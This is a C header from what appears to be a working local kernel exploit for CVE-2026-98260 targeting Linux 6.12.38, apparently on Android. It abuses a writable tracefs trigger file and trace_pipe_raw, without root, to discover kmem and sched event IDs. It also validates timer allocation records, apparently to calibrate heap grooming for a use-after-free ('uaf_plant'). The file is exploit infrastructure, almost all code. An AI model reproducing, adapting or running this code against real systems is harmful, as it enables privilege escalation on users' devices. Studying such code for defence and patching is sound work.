/*
 * CVE-2026-98260 - runtime kmem trace event IDs.
 *
 * The raw trace records use event IDs assigned at boot.  They are not an ABI
 * and change when the kernel's trace event table changes (6.12.38 uses
 * 318/319/322/324).  Prefer the tracefs "id" files when readable; otherwise
 * isolate one event at a time and discover its raw record type.  No root is
 * required for the probe: it only uses the same writable trigger file and
 * trace_pipe_raw that the exploit already needs.
 */
#ifndef CVE98260_TRACE_IDS_H
#define CVE98260_TRACE_IDS_H

#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/wait.h>

#include "kernel_profile.h"

#define CVE98260_TRACE_IDS_TR "/sys/kernel/tracing"
#define CVE98260_TRACE_IDS_PAGE 4096UL

struct cve98260_trace_ids {
    unsigned kmem_cache_alloc;
    unsigned kmalloc;
    unsigned mm_page_free;
    unsigned mm_page_alloc;
    unsigned sched_process_exec;
};

/* 6.12.38 defaults; the probe or the id files replace them at runtime. */
static struct cve98260_trace_ids cve98260_tids = {
    318, 319, 322, 324, 0,
};

#define EV_KMEM_CACHE_ALLOC (cve98260_tids.kmem_cache_alloc)
#define EV_KMALLOC          (cve98260_tids.kmalloc)
#define EV_MM_PAGE_FREE     (cve98260_tids.mm_page_free)
#define EV_MM_PAGE_ALLOC    (cve98260_tids.mm_page_alloc)
#define EV_SCHED_PROCESS_EXEC (cve98260_tids.sched_process_exec)

static int cve98260_tid_wr(const char *path, const char *s)
{
    int fd = open(path, O_WRONLY);
    int ret;

    if (fd < 0)
        return -1;
    ret = write(fd, s, strlen(s));
    close(fd);
    return ret < 0 ? -1 : 0;
}

static void cve98260_tid_trigger(const char *cmd)
{
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR
                    "/events/kmem/rss_stat/trigger", cmd);
}

static void cve98260_tid_clear_triggers(void)
{
    static const char *const all[] = {
        "kmem_cache_alloc", "kmalloc", "mm_page_free", "mm_page_alloc",
    };
    char cmd[96];

    for (size_t i = 0; i < sizeof(all) / sizeof(all[0]); i++) {
        snprintf(cmd, sizeof(cmd), "!enable_event:kmem:%s\n", all[i]);
        cve98260_tid_trigger(cmd);
        snprintf(cmd, sizeof(cmd), "!disable_event:kmem:%s\n", all[i]);
        cve98260_tid_trigger(cmd);
    }
    cve98260_tid_trigger("!enable_event:sched:sched_process_exec\n");
    cve98260_tid_trigger("!disable_event:sched:sched_process_exec\n");
}

static void cve98260_tid_disable_all(void)
{
    static const char *const all[] = {
        "kmem_cache_alloc", "kmalloc", "mm_page_free", "mm_page_alloc",
    };
    char cmd[96];

    for (size_t i = 0; i < sizeof(all) / sizeof(all[0]); i++) {
        snprintf(cmd, sizeof(cmd), "disable_event:kmem:%s\n", all[i]);
        cve98260_tid_trigger(cmd);
    }
    cve98260_tid_trigger("!enable_event:sched:sched_process_exec\n");
    cve98260_tid_trigger("!disable_event:sched:sched_process_exec\n");
}

static unsigned cve98260_tid_u32(const unsigned char *b, size_t o)
{
    unsigned v;

    memcpy(&v, b + o, sizeof(v));
    return v;
}

static unsigned long long cve98260_tid_u64(const unsigned char *b, size_t o)
{
    unsigned long long v;

    memcpy(&v, b + o, sizeof(v));
    return v;
}

static int cve98260_tid_read_file(const char *name, unsigned *out)
{
    char path[160];
    FILE *f;

    snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
             "/events/kmem/%s/id", name);
    f = fopen(path, "r");
    if (!f)
        return -1;
    if (fscanf(f, "%u", out) != 1) {
        fclose(f);
        return -1;
    }
    fclose(f);
    return 0;
}

static int cve98260_tid_read_sys_file(const char *system, const char *name,
                                      unsigned *out)
{
    char path[160];
    FILE *f;

    snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
             "/events/%s/%s/id", system, name);
    f = fopen(path, "r");
    if (!f)
        return -1;
    if (fscanf(f, "%u", out) != 1) {
        fclose(f);
        return -1;
    }
    fclose(f);
    return 0;
}

static void cve98260_tid_drain(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    int fd;

    snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
             "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}

static void cve98260_tid_reset_all(void)
{
    int fd = open(CVE98260_TRACE_IDS_TR "/trace", O_WRONLY | O_TRUNC);

    if (fd >= 0)
        close(fd);
    for (int c = 0; c < 8; c++)
        cve98260_tid_drain(c);
}

static long cve98260_tid_read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    int fd;

    snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
             "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap) {
        ssize_t n = read(fd, buf + tot, cap - tot);

        if (n <= 0)
            break;
        tot += (size_t)n;
    }
    close(fd);
    return (long)tot;
}

static int cve98260_tid_types(const unsigned char *b, size_t n,
                              unsigned *types, unsigned *counts, int max)
{
    int found = 0;

    for (size_t base = 0; base + CVE98260_TRACE_IDS_PAGE <= n;
         base += CVE98260_TRACE_IDS_PAGE) {
        unsigned long long commit = cve98260_tid_u64(b, base + 8);
        size_t o = base + 16;
        size_t end = base + 16 + commit;

        if (end > base + CVE98260_TRACE_IDS_PAGE)
            end = base + CVE98260_TRACE_IDS_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = cve98260_tid_u32(b, o);
            unsigned tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + cve98260_tid_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + cve98260_tid_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            if (data && total >= 4 && o + (tl == 0 ? 8 : 4) + 4 <= end) {
                size_t p = o + (tl == 0 ? 8 : 4);
                unsigned type = cve98260_tid_u32(b, p) & 0xffff;
                int i;

                for (i = 0; i < found; i++) {
                    if (types[i] == type) {
                        counts[i]++;
                        break;
                    }
                }
                if (i == found && found < max) {
                    types[found] = type;
                    counts[found] = 1;
                    found++;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return found;
}

static void cve98260_tid_gen_timers(void)
{
    int i;

    for (i = 0; i < 16; i++) {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t) == 0)
            timer_delete(t);
    }
}

static void cve98260_tid_gen_pages(void)
{
    size_t len = 16UL << 20;
    unsigned char *p = (unsigned char *)mmap(NULL, len, PROT_READ | PROT_WRITE,
                                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < len; i += CVE98260_TRACE_IDS_PAGE)
        p[i] = 1;
    munmap(p, len);
}

static void cve98260_tid_kick(void)
{
    size_t len = 4UL << 20;
    unsigned char *p = (unsigned char *)mmap(NULL, len, PROT_READ | PROT_WRITE,
                                             MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < len; i += CVE98260_TRACE_IDS_PAGE)
        p[i] = 1;
    munmap(p, len);
}

static int cve98260_tid_probe_one(const char *name, int cpu,
                                  void (*gen)(void), unsigned *out)
{
    unsigned types[32];
    unsigned counts[32];
    unsigned char *buf;
    long n;
    int found;
    int best = -1;
    char cmd[96];

    /* The event may have been enabled by an existing trigger.  Remove the
     * target's disable trigger, then enable only this event. */
    snprintf(cmd, sizeof(cmd), "!disable_event:kmem:%s\n", name);
    cve98260_tid_trigger(cmd);
    snprintf(cmd, sizeof(cmd), "!enable_event:kmem:%s\n", name);
    cve98260_tid_trigger(cmd);
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");
    cve98260_tid_reset_all();

    snprintf(cmd, sizeof(cmd), "enable_event:kmem:%s\n", name);
    if (cve98260_tid_wr(CVE98260_TRACE_IDS_TR
                        "/events/kmem/rss_stat/trigger", cmd) != 0) {
        printf("[trace-ids] probe %s: enable failed (%s)\n",
               name, strerror(errno));
        return -1;
    }
    cve98260_tid_kick();
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");
    cve98260_tid_reset_all();

    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "1");
    gen();
    usleep(20000);
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");

    buf = (unsigned char *)malloc(8UL << 20);
    if (!buf) {
        printf("[trace-ids] probe %s: malloc failed\n", name);
        snprintf(cmd, sizeof(cmd), "disable_event:kmem:%s\n", name);
        cve98260_tid_wr(CVE98260_TRACE_IDS_TR
                        "/events/kmem/rss_stat/trigger", cmd);
        return -1;
    }
    n = cve98260_tid_read_cpu(cpu, buf, 8UL << 20);
    found = n > 0 ? cve98260_tid_types(buf, (size_t)n, types, counts, 32) : 0;
    if (n <= 0)
        printf("[trace-ids] probe %s: raw read=%ld (%s)\n",
               name, n, n < 0 ? strerror(errno) : "empty");
    free(buf);

    snprintf(cmd, sizeof(cmd), "!enable_event:kmem:%s\n", name);
    cve98260_tid_trigger(cmd);
    snprintf(cmd, sizeof(cmd), "disable_event:kmem:%s\n", name);
    cve98260_tid_trigger(cmd);
    cve98260_tid_kick();
    cve98260_tid_reset_all();

    for (int i = 0; i < found; i++) {
        if (best < 0 || counts[i] > counts[best])
            best = i;
    }
    if (best < 0) {
        printf("[trace-ids] probe %s: no record\n", name);
        return -1;
    }
    *out = types[best];
    printf("[trace-ids] probe %s: id=%u (types=%d)\n",
           name, types[best], found);
    return 0;
}

/*
 * Return the raw event type of the record whose common pid matches.  The
 * record header is type(2) flags(1) preempt_count(1) pid(4).
 */
static int cve98260_tid_find_pid_type(const unsigned char *b, size_t n,
                                      int pid, unsigned *out)
{
    for (size_t base = 0; base + CVE98260_TRACE_IDS_PAGE <= n;
         base += CVE98260_TRACE_IDS_PAGE) {
        unsigned long long commit = cve98260_tid_u64(b, base + 8);
        size_t o = base + 16;
        size_t end = base + 16 + commit;

        if (end > base + CVE98260_TRACE_IDS_PAGE)
            end = base + CVE98260_TRACE_IDS_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = cve98260_tid_u32(b, o);
            unsigned tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + cve98260_tid_u32(b, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + cve98260_tid_u32(b, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            if (data && o + (tl == 0 ? 8 : 4) + 8 <= end) {
                size_t p = o + (tl == 0 ? 8 : 4);
                unsigned type = cve98260_tid_u32(b, p) & 0xffff;
                int rpid;

                memcpy(&rpid, b + p + 4, sizeof(rpid));
                if (type && rpid == pid) {
                    *out = type;
                    return 0;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
    }
    return -1;
}

static int cve98260_tid_trigger_has(const char *needle)
{
    char path[160];
    char line[256];
    FILE *f;
    int found = 0;

    snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
             "/events/kmem/rss_stat/trigger");
    f = fopen(path, "r");
    if (!f)
        return 0;
    while (fgets(line, sizeof(line), f))
        if (strstr(line, needle)) {
            found = 1;
            break;
        }
    fclose(f);
    return found;
}

/*
 * Probe the sched_process_exec event ID.  The id files are unreadable from
 * the shell (Permission denied) and the enable file is not writable, so the
 * event is enabled through the rss_stat enable_event trigger.  Run one exec
 * on the probe CPU and take the raw type whose pid matches the child.
 */
static int cve98260_tid_probe_exec(int cpu, unsigned *out)
{
    unsigned base_types[32], counts[32];
    unsigned char *buf;
    long n;
    int nb;
    int found = 0;
    pid_t p;
    char cmd[96];

    cve98260_tid_clear_triggers();
    cve98260_tid_disable_all();
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");
    cve98260_tid_reset_all();

    snprintf(cmd, sizeof(cmd), "enable_event:sched:sched_process_exec\n");
    if (cve98260_tid_wr(CVE98260_TRACE_IDS_TR
                        "/events/kmem/rss_stat/trigger", cmd) != 0) {
        int e = errno;

        if (e != EEXIST) {
            printf("[trace-ids] probe sched_process_exec: enable failed "
                   "(%s)\n", strerror(e));
            cve98260_tid_clear_triggers();
            return -1;
        }
        /* An existing enable_event trigger is fine: the event is on. */
    }
    if (!cve98260_tid_trigger_has("enable_event:sched:sched_process_exec")) {
        printf("[trace-ids] probe sched_process_exec: trigger missing\n");
        cve98260_tid_clear_triggers();
        return -1;
    }
    cve98260_tid_kick();
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "1");
    usleep(20000);
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");
    buf = (unsigned char *)malloc(4UL << 20);
    if (!buf) {
        cve98260_tid_clear_triggers();
        return -1;
    }
    n = cve98260_tid_read_cpu(cpu, buf, 4UL << 20);
    nb = n > 0 ? cve98260_tid_types(buf, (size_t)n, base_types, counts, 32)
               : 0;
    cve98260_tid_reset_all();

    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "1");
    p = fork();
    if (p == 0) {
        cpu_set_t set;
        char *const av[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
        char *const ep[] = { (char *)"PATH=/system/bin", NULL };

        CPU_ZERO(&set);
        CPU_SET(cpu, &set);
        sched_setaffinity(0, sizeof(set), &set);
        execve("/proc/self/exe", av, ep);
        _exit(127);
    }
    if (p > 0)
        waitpid(p, NULL, 0);
    usleep(20000);
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");

    for (int c = 0; c < 8 && !found && p > 0; c++) {
        unsigned ex_type = 0;

        n = cve98260_tid_read_cpu(c, buf, 4UL << 20);
        if (n <= 0)
            continue;
        if (cve98260_tid_find_pid_type(buf, (size_t)n, (int)p,
                                       &ex_type) != 0)
            continue;
        {
            int seen = 0;

            for (int j = 0; j < nb; j++)
                if (base_types[j] == ex_type)
                    seen = 1;
            if (!seen) {
                *out = ex_type;
                found = 1;
            }
        }
    }
    free(buf);

    snprintf(cmd, sizeof(cmd), "!enable_event:sched:sched_process_exec\n");
    cve98260_tid_trigger(cmd);
    cve98260_tid_clear_triggers();
    cve98260_tid_reset_all();

    /* Diagnostics for the probe's RCU/trace/trigger side effects. */
    usleep(200000);
    {
        unsigned char tmp[65536];
        long used = 0;

        for (int c = 0; c < 8; c++) {
            char path[128];
            int fd;
            ssize_t r;

            snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
                     "/per_cpu/cpu%d/trace_pipe_raw", c);
            fd = open(path, O_RDONLY | O_NONBLOCK);
            if (fd < 0)
                continue;
            while ((r = read(fd, tmp, sizeof(tmp))) > 0)
                used += r;
            close(fd);
        }
        printf("[trace-ids] probe sched_process_exec cleanup raw_used=%ld\n",
               used);
    }
    {
        char path[160], line[256];
        FILE *f;

        snprintf(path, sizeof(path), CVE98260_TRACE_IDS_TR
                 "/events/kmem/rss_stat/trigger");
        printf("[trace-ids] trigger:");
        f = fopen(path, "r");
        if (f) {
            while (fgets(line, sizeof(line), f)) {
                line[strcspn(line, "\n")] = 0;
                printf(" %s", line);
            }
            fclose(f);
        } else {
            printf(" unreadable");
        }
        printf("\n");
    }
    if (!found)
        printf("[trace-ids] probe sched_process_exec: no record\n");
    return found ? 0 : -1;
}

/*
 * Confirm that a candidate kmem_cache_alloc type really carries the timer
 * allocation we expect.  The probe used to pick the most frequent record,
 * which can occasionally be an unrelated event (observed: type 5 instead of
 * 318 on 6.12.38); calibrate_base() then fails with count=0.
 */
static int cve98260_tid_validate_kmem(int cpu, unsigned type,
                                      unsigned long long low21)
{
    unsigned char *buf;
    char cmd[96];
    long n;
    int ok = 0;

    if (!type || !low21)
        return 0;
    /* probe_one() leaves a disable_event trigger behind; remove it first. */
    cve98260_tid_clear_triggers();
    cve98260_tid_kick();
    snprintf(cmd, sizeof(cmd), "enable_event:kmem:kmem_cache_alloc\n");
    if (cve98260_tid_wr(CVE98260_TRACE_IDS_TR
                        "/events/kmem/rss_stat/trigger", cmd) != 0) {
        printf("[trace-ids] val enable failed errno=%d\n", errno);
        return 0;
    }
    cve98260_tid_kick();
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");
    cve98260_tid_reset_all();
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "1");
    cve98260_tid_gen_timers();
    usleep(20000);
    cve98260_tid_wr(CVE98260_TRACE_IDS_TR "/tracing_on", "0");

    buf = (unsigned char *)malloc(4UL << 20);
    if (!buf)
        goto out;
    n = cve98260_tid_read_cpu(cpu, buf, 4UL << 20);
    for (size_t base = 0; n > 0 && base + CVE98260_TRACE_IDS_PAGE <= (size_t)n;
         base += CVE98260_TRACE_IDS_PAGE) {
        unsigned long long commit = cve98260_tid_u64(buf, base + 8);
        size_t o = base + 16;
        size_t end = base + 16 + commit;

        if (end > base + CVE98260_TRACE_IDS_PAGE)
            end = base + CVE98260_TRACE_IDS_PAGE;
        while (o + 4 <= end) {
            unsigned hdr = cve98260_tid_u32(buf, o);
            unsigned tl = hdr & 31;
            unsigned td = hdr >> 5;
            size_t total;
            int data = 0;

            if (tl == 29) {
                if (!td)
                    break;
                total = 4 + cve98260_tid_u32(buf, o + 4);
            } else if (tl == 30 || tl == 31) {
                total = 8;
            } else if (tl == 0) {
                total = 4 + cve98260_tid_u32(buf, o + 4);
                data = 1;
            } else {
                total = 4 + tl * 4;
                data = 1;
            }
            size_t p = o + (tl == 0 ? 8 : 4);
            if (data && total >= 40 && p + 40 <= end &&
                (cve98260_tid_u32(buf, p) & 0xffff) == type) {
                unsigned long long site = cve98260_tid_u64(buf, p + 8);
                unsigned long long req = cve98260_tid_u64(buf, p + 24);
                unsigned long long alloc = cve98260_tid_u64(buf, p + 32);

                if ((site & 0x1fffffULL) == low21 &&
                    req == 0x100ULL && alloc == 0x100ULL) {
                    ok = 1;
                    break;
                }
            }
            if (total < 4)
                break;
            o += total;
        }
        if (ok)
            break;
    }
    free(buf);
out:
    snprintf(cmd, sizeof(cmd), "disable_event:kmem:kmem_cache_alloc\n");
    cve98260_tid_trigger(cmd);
    cve98260_tid_clear_triggers();
    cve98260_tid_reset_all();
    return ok;
}

static unsigned cve98260_tid_env(const char *name, unsigned fallback)
{
    const char *s = getenv(name);
    char *end = NULL;
    unsigned long v;

    if (!s || !*s)
        return fallback;
    v = strtoul(s, &end, 0);
    if (!end || *end || v > 0xffff)
        return fallback;
    return (unsigned)v;
}

static int cve98260_trace_ids_init(int cpu, int verbose, int force_probe)
{
    struct cve98260_trace_ids ids = cve98260_tids;
    struct cve98260_trace_ids cand[3];
    int ncand = 0;
    int accepted = 0;
    int from_files = 0;
    int from_profile = 0;
    const char *source = "probe";
    const struct cve98260_profile *p = cve98260_active_profile;
    int env_all = getenv("CVE98260_EVENT_KMEM_ALLOC") &&
                  getenv("CVE98260_EVENT_KMALLOC") &&
                  getenv("CVE98260_EVENT_MM_PAGE_FREE") &&
                  getenv("CVE98260_EVENT_MM_PAGE_ALLOC");

    if (env_all) {
        ids.kmem_cache_alloc = cve98260_tid_env("CVE98260_EVENT_KMEM_ALLOC",
                                                ids.kmem_cache_alloc);
        ids.kmalloc = cve98260_tid_env("CVE98260_EVENT_KMALLOC", ids.kmalloc);
        ids.mm_page_free = cve98260_tid_env("CVE98260_EVENT_MM_PAGE_FREE",
                                             ids.mm_page_free);
        ids.mm_page_alloc = cve98260_tid_env("CVE98260_EVENT_MM_PAGE_ALLOC",
                                              ids.mm_page_alloc);
        source = "env";
    } else if (!force_probe && p && p->trace_kmem_alloc &&
               p->trace_kmalloc && p->trace_mm_page_free &&
               p->trace_mm_page_alloc) {
        ids.kmem_cache_alloc = p->trace_kmem_alloc;
        ids.kmalloc = p->trace_kmalloc;
        ids.mm_page_free = p->trace_mm_page_free;
        ids.mm_page_alloc = p->trace_mm_page_alloc;
        from_profile = 1;
        source = "profile";
    }

    if (!env_all && !from_profile &&
        cve98260_tid_read_file("kmem_cache_alloc", &ids.kmem_cache_alloc) == 0 &&
        cve98260_tid_read_file("kmalloc", &ids.kmalloc) == 0 &&
        cve98260_tid_read_file("mm_page_free", &ids.mm_page_free) == 0 &&
        cve98260_tid_read_file("mm_page_alloc", &ids.mm_page_alloc) == 0) {
        from_files = 1;
        source = "id files";
    }

    if (!env_all && !from_profile && !from_files) {
        for (int round = 0; round < 3 && !accepted; round++) {
            struct cve98260_trace_ids cur = ids;
            unsigned long long low21 = p ? p->timer_low21 : 0;

            cve98260_tid_clear_triggers();
            cve98260_tid_disable_all();
            cve98260_tid_kick();
            if (cve98260_tid_probe_one("kmem_cache_alloc", cpu,
                                       cve98260_tid_gen_timers,
                                       &cur.kmem_cache_alloc) != 0 ||
                cve98260_tid_probe_one("mm_page_free", cpu,
                                       cve98260_tid_gen_pages,
                                       &cur.mm_page_free) != 0 ||
                cve98260_tid_probe_one("mm_page_alloc", cpu,
                                       cve98260_tid_gen_pages,
                                       &cur.mm_page_alloc) != 0) {
                cve98260_tid_clear_triggers();
                break;
            }

            /*
             * A type count alone is not enough: unrelated events generated
             * by timer_create() can outnumber the allocation event.  When
             * the profile has the timer call-site, require the candidate to
             * carry a timer record with req/alloc 0x100.
             */
            if (low21 && !cve98260_tid_validate_kmem(cpu, cur.kmem_cache_alloc,
                                                     low21)) {
                printf("[trace-ids] probe kmem_cache_alloc=%u rejected "
                       "(timer validation failed)\n",
                       cur.kmem_cache_alloc);
                cve98260_tid_clear_triggers();
                continue;
            }
            cve98260_tid_clear_triggers();

            /*
             * A probe that isolates one event can still report the
             * dominant unrelated record when the enable trigger did not
             * take effect (observed as mm_page_free == mm_page_alloc ==
             * the sched_process_exec id).  A single such sample must not
             * be used: both mm events have distinct ids, so an equal pair
             * can never be valid, and calibrating from it fails later
             * with no hint about the cause.
             */
            if (!cur.kmem_cache_alloc || !cur.mm_page_free ||
                !cur.mm_page_alloc || cur.mm_page_free == cur.mm_page_alloc) {
                printf("[trace-ids] probe rejected: invalid ids "
                       "(kmem=%u free=%u alloc=%u round=%d)\n",
                       cur.kmem_cache_alloc, cur.mm_page_free,
                       cur.mm_page_alloc, round + 1);
                cve98260_tid_clear_triggers();
                continue;
            }

            if (ncand > 0 &&
                cur.kmem_cache_alloc == cand[0].kmem_cache_alloc &&
                cur.mm_page_free == cand[0].mm_page_free &&
                cur.mm_page_alloc == cand[0].mm_page_alloc) {
                ids = cur;
                accepted = 1;
                break;
            }
            if (ncand < 3)
                cand[ncand++] = cur;
        }
        cve98260_tid_clear_triggers();
        if (!accepted) {
            if (ncand == 0) {
                printf("[trace-ids] probe failed: no consistent event IDs\n");
                return -1;
            }
            ids = cand[0];
            source = "probe-single";
            printf("[trace-ids] warning: using a single probe sample\n");
        } else {
            source = "probe";
        }
    }

    ids.kmem_cache_alloc = cve98260_tid_env("CVE98260_EVENT_KMEM_ALLOC",
                                             ids.kmem_cache_alloc);
    ids.kmalloc = cve98260_tid_env("CVE98260_EVENT_KMALLOC", ids.kmalloc);
    ids.mm_page_free = cve98260_tid_env("CVE98260_EVENT_MM_PAGE_FREE",
                                         ids.mm_page_free);
    ids.mm_page_alloc = cve98260_tid_env("CVE98260_EVENT_MM_PAGE_ALLOC",
                                          ids.mm_page_alloc);
    if (!ids.kmalloc)
        ids.kmalloc = 319;

    {
        unsigned ex = 0;

        /*
         * sched_process_exec 的 trigger 间接使能在目标内核上不可靠：
         * 4 个 clean boot 中仅 1 次探测到 type（653）；其余 3 次 trigger
         * 文件确认 enable_event 已写入，但 raw 中没有事件。不能依赖此
         * 信号。默认关闭；需要时用 CVE98260_EXEC_PROBE=1 触发 probe，
         * 或用 CVE98260_EVENT_SCHED_PROCESS_EXEC=<id> 手动指定。
         */
        {
            const char *probe = getenv("CVE98260_EXEC_PROBE");

            if (probe && !strcmp(probe, "1")) {
                if (cve98260_tid_read_sys_file("sched",
                                               "sched_process_exec",
                                               &ex) == 0)
                    ids.sched_process_exec = ex;
                else if (cve98260_tid_probe_exec(cpu, &ex) == 0)
                    ids.sched_process_exec = ex;
            }
        }
        if (!ids.sched_process_exec)
            ids.sched_process_exec = cve98260_tid_env(
                "CVE98260_EVENT_SCHED_PROCESS_EXEC", 0);
    }

    cve98260_tids = ids;
    (void)verbose;
    printf("[trace-ids] kmem_cache_alloc=%u kmalloc=%u "
           "mm_page_free=%u mm_page_alloc=%u sched_process_exec=%u (%s)\n",
           ids.kmem_cache_alloc, ids.kmalloc,
           ids.mm_page_free, ids.mm_page_alloc, ids.sched_process_exec,
           source);
    return 0;
}

#endif /* CVE98260_TRACE_IDS_H */
